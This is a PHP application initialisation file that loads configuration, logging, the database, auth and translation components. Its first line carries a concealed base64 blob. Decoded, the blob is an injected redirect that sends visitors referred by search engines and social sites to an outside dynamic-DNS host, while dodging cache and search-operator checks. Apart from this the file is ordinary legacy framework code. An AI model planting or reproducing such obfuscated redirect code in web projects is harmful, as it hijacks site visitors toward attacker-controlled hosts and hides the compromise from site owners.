<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

if (!defined('GENERIC_PATH') or !defined('APPROOT_PATH')) 
  die('Not initialized');

error_reporting(E_ALL & ~E_COMPILE_WARNING);

define('CONFIG_PATH', APPROOT_PATH.'config/');  
define('CLASS_PATH',  APPROOT_PATH.'classes/');  

if (defined("BLOCKED")) {
  echo('<table width="100%"><tr><td align="center">Site is curently closed. Please come back later</td></tr></table>');
  exit();
}
  
define('CONSOLE_MODE', !array_key_exists('REQUEST_METHOD', $_SERVER));
define('SUBMIT_MODE',  count($_POST) || count($_FILES));

ini_set('url_rewriter.tags', null);

require_once(GENERIC_PATH.'utils/utils.php');
require_once(GENERIC_PATH.'utils/image_file.php');
  
set_magic_quotes_runtime(0);

if (get_magic_quotes_gpc()) { 
  stripslashes_everywhere($_GET);
  stripslashes_everywhere($_POST);
  stripslashes_everywhere($_COOKIE); 
  stripslashes_everywhere($_REQUEST);
  if (isset($_SERVER['PHP_AUTH_USER'])) 
    stripslashes_everywhere($_SERVER['PHP_AUTH_USER']); 
  if (isset($_SERVER['PHP_AUTH_PW']))   
    stripslashes_everywhere($_SERVER['PHP_AUTH_PW']);
}

define('TEMPORARY_PATH', APPROOT_PATH.'_tmp/');
mk_dir(TEMPORARY_PATH);
  
@define('LOGS_PATH', APPROOT_PATH.'_logs/');

require_once(GENERIC_PATH.'utils/log.php');
$log = new log(LOGS_PATH);

require_once(GENERIC_PATH.'utils/error_handler.php');
$error_handler = new error_handler();

$log->start('Application');
$log->start('Init');

if (!CONSOLE_MODE) {
  require_once(GENERIC_PATH.'url/url_dynamic.php');
  $url = new url_dynamic();
} else {
  require_once(GENERIC_PATH.'url/url_none.php');
  $url = new url_none();
}

if (defined('DB_ENGINE')) {
  $db_class = DB_ENGINE;
  set_undefined_config('db', 'server', 'localhost');
  require_once(GENERIC_PATH.'db/'.DB_ENGINE.'.php');
  $db = new $db_class(get_const('DB_SERVER'), get_const('DB_NAME'), get_const('DB_USER'), get_const('DB_PASSWORD'));
}  

if (file_exists(CONFIG_PATH.'def_db.php'))
  require_once(CONFIG_PATH.'def_db.php');

require_once(GENERIC_PATH.'db/data_manager.php');
$dm = new data_manager();

if (file_exists(CONFIG_PATH.'def_code.php'))
  require_once(CONFIG_PATH.'def_code.php');

if (defined('DB_ENGINE')) {
  if (file_exists(CONFIG_PATH.'def_dm.php'))
    require_once(CONFIG_PATH.'def_dm.php');
  if (file_exists(CONFIG_PATH.'def_audit.php'))
    require_once(CONFIG_PATH.'def_audit.php');
  if (file_exists(CONFIG_PATH.'def_schema.php'))
    require_once(CONFIG_PATH.'def_schema.php');
}
  
require_once(GENERIC_PATH.'auth/auth_none.php');
$auth = new auth_none();
$auth->init();

require_once(GENERIC_PATH.'multilang/translator.php');
$trn = new translator();

$log->finish('Init');

?>